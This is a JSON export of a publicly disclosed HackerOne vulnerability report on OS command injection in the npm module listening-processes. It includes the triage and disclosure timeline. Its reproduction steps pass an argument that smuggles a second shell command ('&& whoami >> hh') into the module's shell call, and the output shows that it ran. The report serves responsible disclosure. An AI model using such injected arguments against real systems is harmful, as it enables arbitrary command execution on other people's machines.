{"id":511459,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTE0NTk=","url":"https://hackerone.com/reports/511459","title":"[listening-processes] Command Injection","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-18T08:14:28.733Z","submitted_at":"2019-03-18T08:14:28.733Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"notpwnguy","url":"/notpwnguy","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-02T23:00:31.595Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-01-03T23:00:28.210Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report Command Injection in listening-processes\nIt allows an attacker to execute arbitrary commands.\n\n# Module\n\n**module name:** listening-processes\n**version:** 1.2.0\n**npm page:** `https://www.npmjs.com/package/listening-processes`\n\n## Module Description\n\n\u003e A simple NPM module for retrieving pertinent info on processes which are listening on local ports, and for killing those processes using shell commands lsof, ps, and kill in the background.\n\n## Module Stats\n\n6 downloads in the last day\n12 downloads in the last week\n28 downloads in the last month\n\n# Vulnerability\n\n## Vulnerability Description\n\n\u003e An attacker can execute arbitrary commands by escaping the binaries used by the module since it uses bash commands. \n\n## Steps To Reproduce:\n\n```\n$ node\n\u003e const processes = require('listening-processes')\n\u003e processes(`'Python \u0026\u0026 whoami \u003e\u003e hh;'`)\n/bin/sh: \\s.*:[0-9]* (LISTEN): command not found\n{ Python:\n   [ { command: 'Python',\n       pid: '14720',\n       port: '8000',\n       invokingCommand:\n        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }\n```\n```\n$ cat hh\nnotpwnguy\n```\n## Patch\n\n\u003e If you're able to provide a patch with the fix please post it in this section\n\n## Supporting Material/References:\n\n\u003e State all technical information about the stack where the vulnerability was found\n\n- OPERATING SYSTEM VERSION : Mac Os\n- NODEJS VERSION : v10.5.0\n- NPM VERSION : 6.2.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nArbitrary Commands can be executed!","vulnerability_information_html":"\u003cp\u003eI would like to report Command Injection in listening-processes\u003cbr\u003e\nIt allows an attacker to execute arbitrary commands.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e listening-processes\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.2.0\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/listening-processes\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eA simple NPM module for retrieving pertinent info on processes which are listening on local ports, and for killing those processes using shell commands lsof, ps, and kill in the background.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e6 downloads in the last day\u003cbr\u003e\n12 downloads in the last week\u003cbr\u003e\n28 downloads in the last month\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAn attacker can execute arbitrary commands by escaping the binaries used by the module since it uses bash commands. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ node\n\u0026gt; const processes = require(\u0026#39;listening-processes\u0026#39;)\n\u0026gt; processes(`\u0026#39;Python \u0026amp;\u0026amp; whoami \u0026gt;\u0026gt; hh;\u0026#39;`)\n/bin/sh: \\s.*:[0-9]* (LISTEN): command not found\n{ Python:\n   [ { command: \u0026#39;Python\u0026#39;,\n       pid: \u0026#39;14720\u0026#39;,\n       port: \u0026#39;8000\u0026#39;,\n       invokingCommand:\n        \u0026#39;/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server\u0026#39; } ] }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ cat hh\nnotpwnguy\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIf you\u0026#39;re able to provide a patch with the fix please post it in this section\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION : Mac Os\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION : v10.5.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION : 6.2.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eArbitrary Commands can be executed!\u003c/p\u003e\n","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-02-02T23:00:28.294Z","allow_singular_disclosure_after":-28537946.778558332,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4343419,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-03-18T08:14:34.564Z","updated_at":"2019-03-18T08:14:34.564Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4429222,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.\n\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.\u003c/p\u003e\n\n\u003cp\u003eI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-31T19:17:30.125Z","updated_at":"2019-03-31T19:17:30.125Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4429225,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-31T19:18:11.283Z","updated_at":"2019-03-31T19:18:11.283Z","additional_data":{"old_title":"Command Injection in listening-processes module","new_title":"[listening-processes] Command Injection"},"actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6684488,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"No response from the maintainer, this one only has 7 weekly downloads so I think we are safe to go public with the report.","markdown_message":"\u003cp\u003eNo response from the maintainer, this one only has 7 weekly downloads so I think we are safe to go public with the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-03T22:55:03.589Z","updated_at":"2020-01-03T22:55:03.589Z","actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"notpwnguy","url":"/notpwnguy"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6684508,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-03T23:00:28.228Z","updated_at":"2020-01-03T23:00:28.228Z","first_to_agree":true,"actor":{"username":"ronperris","cleared":false,"url":"/ronperris","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/267/443/1a8173396b482236436c5172363ceb9f64ef27dd_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6945570,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-02T23:00:31.615Z","updated_at":"2020-02-02T23:00:31.615Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}